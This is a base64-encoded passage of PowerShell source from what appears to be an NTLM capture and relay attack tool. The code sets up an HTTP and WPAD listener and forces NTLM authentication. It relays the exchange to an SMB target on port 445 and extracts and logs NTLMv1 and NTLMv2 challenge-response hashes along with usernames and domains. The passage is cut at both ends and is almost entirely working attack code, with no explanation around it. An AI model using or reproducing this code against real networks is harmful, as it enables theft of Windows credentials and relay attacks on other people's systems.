iAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwweDAwLDB4NmMsMHgwMCwweDAzLDB4MDAsMHgyNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDY4LDB4MDAsMHg2ZiwweDAwLDB4NzMsMHgwMCwweDc0LDB4MDAsMHg2ZSwweDAwLDB4NjEsMHgwMCwweDZkLDB4MDAsMHg2NSwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAweDJlLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg2YywweDAwLDB4MDUsMHgwMCwweDEyLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLDB4MDAsMHg2YywweDAwLDB4MDcsMHgwMCwweDA4LDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF90aW1lc3RhbXAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MGEsMHgwYQoKICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAkTlRMTSA9ICdOVExNICcgKyAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0CiAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlCgogICAgICAgIHJldHVybiAkTlRMTQoKICAgIH0KICAgIAogICAgd2hpbGUgKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICB7CiAgICAgICAgJGludmVpZ2guY29udGV4dCA9ICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuR2V0Q29udGV4dCgpIAogICAgICAgICRpbnZlaWdoLnJlcXVlc3QgPSAkaW52ZWlnaC5jb250ZXh0LlJlcXVlc3QKICAgICAgICAkaW52ZWlnaC5yZXNwb25zZSA9ICRpbnZlaWdoLmNvbnRleHQuUmVzcG9uc2UKICAgICAgICAkaW52ZWlnaC5tZXNzYWdlID0gJycgICAgCiAgICAgICAgJE5UTE0gPSAnTlRMTScKICAgICAgICAKICAgICAgICBpZigkaW52ZWlnaC5yZXF1ZXN0LklzU2VjdXJlQ29ubmVjdGlvbikKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX3R5cGUgPSAiSFRUUFMiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX3R5cGUgPSAiSFRUUCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsIC1tYXRjaCAnL3dwYWQuZGF0JyAtYW5kICRXUEFEQXV0aCAtZXEgJ0Fub255bW91cycpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gMjAwCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLlN0YXR1c0NvZGUgPSA0MDEKICAgICAgICB9CgogICAgICAgICRIVFRQX3JlcXVlc3RfdGltZSA9IEdldC1EYXRlIC1mb3JtYXQgJ3MnCgogICAgICAgIGlmKCRIVFRQX3JlcXVlc3RfdGltZSAtZXEgJEhUVFBfcmVxdWVzdF90aW1lX29sZCAtYW5kICRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsIC1lcSAkSFRUUF9yZXF1ZXN0X3Jhd191cmxfb2xkIC1hbmQgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzIC1lcSAkSFRUUF9yZXF1ZXN0X3JlbW90ZV9lbmRwb2ludF9vbGQpCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9yYXdfdXJsX291dHB1dCA9ICRmYWxzZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9yYXdfdXJsX291dHB1dCA9ICR0cnVlCiAgICAgICAgfQoKICAgICAgICBpZighJGludmVpZ2gucmVxdWVzdC5oZWFkZXJzWyJBdXRob3JpemF0aW9uIl0gLWFuZCAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLklzTGlzdGVuaW5nIC1hbmQgJEhUVFBfcmF3X3VybF9vdXRwdXQpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfcmVxdWVzdF90aW1lIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAiICsgJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgKyAiIHJlY2VpdmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcykKICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiRIVFRQX3JlcXVlc3RfdGltZSAtICRIVFRQX3R5cGUgcmVxdWVzdCBmb3IgIiArICRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsICsgIiByZWNlaXZlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKICAgICAgICB9CgogICAgICAgICRIVFRQX3JlcXVlc3RfcmF3X3VybF9vbGQgPSAkaW52ZWlnaC5yZXF1ZXN0LlJhd1VybAogICAgICAgICRIVFRQX3JlcXVlc3RfcmVtb3RlX2VuZHBvaW50X29sZCA9ICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcwogICAgICAgICRIVFRQX3JlcXVlc3RfdGltZV9vbGQgPSAkSFRUUF9yZXF1ZXN0X3RpbWUKICAgICAgICAgICAgCiAgICAgICAgW1N0cmluZ10gJGF1dGhlbnRpY2F0aW9uX2hlYWRlciA9ICRpbnZlaWdoLnJlcXVlc3QuaGVhZGVycy5nZXR2YWx1ZXMoJ0F1dGhvcml6YXRpb24nKQogICAgICAgIAogICAgICAgIGlmKCRhdXRoZW50aWNhdGlvbl9oZWFkZXIuc3RhcnRzd2l0aCgnTlRMTSAnKSkKICAgICAgICB7CiAgICAgICAgICAgICRhdXRoZW50aWNhdGlvbl9oZWFkZXIgPSAkYXV0aGVudGljYXRpb25faGVhZGVyIC1yZXBsYWNlICdOVExNICcsJycKICAgICAgICAgICAgW0J5dGVbXV0gJEhUVFBfcmVxdWVzdF9ieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGF1dGhlbnRpY2F0aW9uX2hlYWRlcikKICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXNbOF0gLWVxIDEpCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5TTUJfcmVsYXkgLWFuZCAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgLWVxIDAgLWFuZCAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgLW5lICRTTUJSZWxheVRhcmdldCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAxCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IHRyaWdnZXJlZCBieSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzICsgIiBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgdHJpZ2dlcmVkIGJ5ICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiR3JhYmJpbmcgY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gR3JhYmJpbmcgY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICIgKyAkU01CUmVsYXlUYXJnZXQpXSkKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNvbm5lY3QoJFNNQlJlbGF5VGFyZ2V0LCI0NDUiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCEkU01CX3JlbGF5X3NvY2tldC5jb25uZWN0ZWQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGlzIG5vdCByZXNwb25kaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBpcyBub3QgcmVzcG9uZGluZyIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgLWVxIDEpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2J5dGVzID0gU01CUmVsYXlDaGFsbGVuZ2UgJFNNQl9yZWxheV9zb2NrZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAyCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfYnl0ZXMgPSAkU01CX3JlbGF5X2J5dGVzWzIuLiRTTUJfcmVsYXlfYnl0ZXMuTGVuZ3RoXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgPSAkU01CX3JlbGF5X2J5dGVzWzM0Li4zM10KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2J5dGVzKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1TU1AgPSAkU01CX3JlbGF5X05UTE1TU1AgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUF9pbmRleCA9ICRTTUJfcmVsYXlfTlRMTVNTUC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ID0gJFNNQl9yZWxheV9OVExNU1NQX2luZGV4IC8gMgogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RvbWFpbl9sZW5ndGggPSBEYXRhTGVuZ3RoICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RvbWFpbl9sZW5ndGhfb2Zmc2V0X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTIpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTkpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGggPSBEYXRhTGVuZ3RoICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyA0MCkgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGhfb2Zmc2V0X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNDApLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkU01CX2RvbWFpbl9sZW5ndGgpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1fY2hhbGxlbmdlID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMjQpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMzEpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3RhcmdldF9kZXRhaWxzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTYgKyAkU01CX2RvbWFpbl9sZW5ndGgpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkU01CX2RvbWFpbl9sZW5ndGggKyAkU01CX3RhcmdldF9sZW5ndGgpXQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2J5dGVzID0gMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kb21haW5fbGVuZ3RoX29mZnNldF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA1LDB4ODIsMHg4OSwweGEyICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTV9jaGFsbGVuZ2UgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdGFyZ2V0X2xlbmd0aF9vZmZzZXRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV90YXJnZXRfZGV0YWlscwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTSAnICsgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NAogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSBTTUJOVExNQ2hhbGxlbmdlICRTTUJfcmVsYXlfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuQWRkKCRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcsJyArICROVExNX2NoYWxsZW5nZSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlJlY2VpdmVkIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUmVjZWl2ZWQgY2hhbGxlbmdlICROVExNX2NoYWxsZW5nZSBmb3IgcmVsYXkgZnJvbSAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJQcm92aWRpbmcgY2hhbGxlbmdlICROVExNX2NoYWxsZW5nZSBmb3IgcmVsYXkgdG8gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcykKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUHJvdmlkaW5nIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IHRvICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJEhUVFBfcmVxdWVzdF9ieXRlc1s4XSAtZXEgMykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTScKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fb2Zmc2V0ID0gJEhUVFBfcmVxdWVzdF9ieXRlc1syNF0KICAgICAgICAgICAgICAgICRIVFRQX05UTE1fbGVuZ3RoID0gRGF0YUxlbmd0aCAyMiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggPSBEYXRhTGVuZ3RoIDI4ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX29mZnNldCA9IERhdGFMZW5ndGggMzIgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgW1N0cmluZ10gJE5UTE1fY2hhbGxlbmdlID0gJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUgLWxpa2UgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5Qb3J0ICsgJyonCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZS5SZW1vdmUoJE5UTE1fY2hhbGxlbmdlKQogICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJE5UTE1fY2hhbGxlbmdlLlN1YnN0cmluZygoJE5UTE1fY2hhbGxlbmdlLkluZGV4T2YoIiwiKSkgKyAxKQogICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyA9ICcnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7ICAKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoIDAgMCAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9sZW5ndGggPSBEYXRhTGVuZ3RoIDM2ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV91c2VyX2xlbmd0aCAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggMCAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCA9IERhdGFMZW5ndGggNDQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyA9IERhdGFUb1N0cmluZyAkSFRUUF9OVExNX2hvc3RfbGVuZ3RoICRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCAkSFRUUF9OVExNX3VzZXJfbGVuZ3RoICRIVFRQX05UTE1fZG9tYWluX29mZnNldCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkSFRUUF9OVExNX2xlbmd0aCAtZXEgMjQpICMgTlRMTXYxCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5UTE1fdHlwZSA9ICJOVExNdjEiCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRIVFRQX3JlcXVlc3RfYnl0ZXNbKCRIVFRQX05UTE1fb2Zmc2V0IC0gMjQpLi4oJEhUVFBfTlRMTV9vZmZzZXQgKyAkSFRUUF9OVExNX2xlbmd0aCldKSAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCg0OCwnOicpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9OVExNX2hhc2ggPSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nICsgIjo6IiArICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyArICI6IiArICROVExNX3Jlc3BvbnNlICsgIjoiICsgJE5UTE1fY2hhbGxlbmdlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJE5UTE1fcmVzcG9uc2UgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICB7ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKSIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQWRkKCRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfbGlzdC5BZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBjYXB0dXJlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgKyAiKCIgKyAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nICsgIik6YG4iICsgJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSB3cml0dGVuIHRvICIgKyAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykgLWFuZCAhJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QuQWRkKCRzb3VyY2VfSVAuSVBBZGRyZXNzVG9TdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgIyBOVExNdjIKICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAkTlRMTV90eXBlID0gIk5UTE12MiIgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICROVExNX3Jlc3BvbnNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWyRIVFRQX05UTE1fb2Zmc2V0Li4oJEhUVFBfTlRMTV9vZmZzZXQgKyAkSFRUUF9OVExNX2xlbmd0aCldKSAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCgzMiwnOicpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9OVExNX2hhc2ggPSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nICsgIjo6IiArICRIVFRQX05UTE1fZG9tYWluX3N0cm